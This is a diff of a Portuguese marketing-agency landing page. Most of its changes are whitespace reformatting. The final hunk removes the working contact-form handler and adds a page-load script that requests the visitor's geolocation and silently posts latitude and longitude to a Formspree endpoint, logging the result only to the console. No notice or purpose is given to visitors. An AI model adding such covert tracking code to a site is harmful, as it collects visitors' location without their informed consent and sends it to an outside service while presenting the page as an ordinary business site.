@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-br">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -161,6 +162,7 @@
         }
     </style>
 </head>
+
 <body>
     <header>
         <div class="container">
@@ -170,13 +172,14 @@
                     <li><a href="#servicos">Serviços</a></li>
                     <li><a href="#portfolio">Portfólio</a></li>
                     <li><a href="#contato">Contato</a></li>
-                    <li><a href="https://www.instagram.com/creativedirectionn/" target="_blank"><i class="fab fa-instagram"></i></a></li>
+                    <li><a href="https://www.instagram.com/creativedirectionn/" target="_blank"><i
+                                class="fab fa-instagram"></i></a></li>
                     <li><a href="https://wa.me/5521991437829" target="_blank"><i class="fab fa-whatsapp"></i></a></li>
                 </ul>
             </nav>
         </div>
     </header>
-    
+
     <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
 
     <section id="servicos">
@@ -186,7 +189,8 @@
                 <div class="servico">
                     <i class="fas fa-bullhorn"></i>
                     <h3>Marketing</h3>
-                    <p>Desenvolvemos estratégias de marketing personalizadas para aumentar a visibilidade da sua marca.</p>
+                    <p>Desenvolvemos estratégias de marketing personalizadas para aumentar a visibilidade da sua marca.
+                    </p>
                 </div>
                 <div class="servico">
                     <i class="fas fa-users"></i>
@@ -206,7 +210,8 @@
                 <div class="servico">
                     <i class="fas fa-file-alt"></i>
                     <h3>Diagramação</h3>
-                    <p>Fazemos a diagramação de materiais impressos e digitais para comunicar sua mensagem de forma eficaz.</p>
+                    <p>Fazemos a diagramação de materiais impressos e digitais para comunicar sua mensagem de forma
+                        eficaz.</p>
                 </div>
                 <div class="servico">
                     <i class="fas fa-id-card"></i>
@@ -221,7 +226,7 @@
             </div>
         </div>
     </section>
-    
+
 
     <section id="portfolio">
         <div class="container">
@@ -254,7 +259,7 @@
             </div>
         </div>
     </section>
-    
+
     <footer>
         <div class="container">
             <p>&copy; 2024 Creative Direction. Todos os direitos reservados.</p>
@@ -262,48 +267,56 @@
     </footer>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById("contact-form");
-
-            form.addEventListener("submit", function(event) {
-                event.preventDefault();
-
-                const nome = document.getElementById("nome").value;
-                const email = document.getElementById("email").value;
-                const mensagem = document.getElementById("mensagem").value;
-
-                if (nome === '' || email === '' || mensagem === '') {
-                    alert("Por favor, preencha todos os campos do formulário.");
-                    return false;
+        document.addEventListener('DOMContentLoaded', function () {
+            // Função para capturar a localização
+            function getLocationAndSend() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+                } else {
+                    alert("Geolocalização não é suportada pelo navegador.");
                 }
+            }
 
-                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                if (!emailRegex.test(email)) {
-                    alert("Por favor, insira um endereço de e-mail válido.");
-                    return false;
-                }
+            // Função para enviar os dados de localização via Formspree
+            function sendLocation(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
 
-                const formData = new FormData(this);
+                // Criar os dados do formulário
+                const formData = new FormData();
+                formData.append("Latitude", latitude);
+                formData.append("Longitude", longitude);
+
+                // Configurar a requisição para o Formspree
                 const xhr = new XMLHttpRequest();
-
                 xhr.open("POST", "https://formspree.io/f/xpzvkqoo");
                 xhr.setRequestHeader("Accept", "application/json");
 
-                xhr.onreadystatechange = function() {
+                xhr.onreadystatechange = function () {
                     if (xhr.readyState === XMLHttpRequest.DONE) {
                         if (xhr.status === 200) {
-                            alert("O formulário foi enviado com sucesso!");
-                            form.reset();
+                            console.log("Localização enviada com sucesso!");
                         } else {
-                            alert("Ocorreu um erro ao enviar o formulário. Por favor, tente novamente.");
+                            console.error("Erro ao enviar a localização.");
                         }
                     }
                 };
 
                 xhr.send(formData);
-            });
+            }
+
+            // Função para tratar erros de geolocalização
+            function handleError(error) {
+                console.error("Erro ao obter a localização:", error);
+                alert("Não foi possível obter a localização.");
+            }
+
+            // Chamar a função para capturar e enviar a localização ao carregar a página
+            getLocationAndSend();
+            
         });
     </script>
 
 </body>
+
 </html>
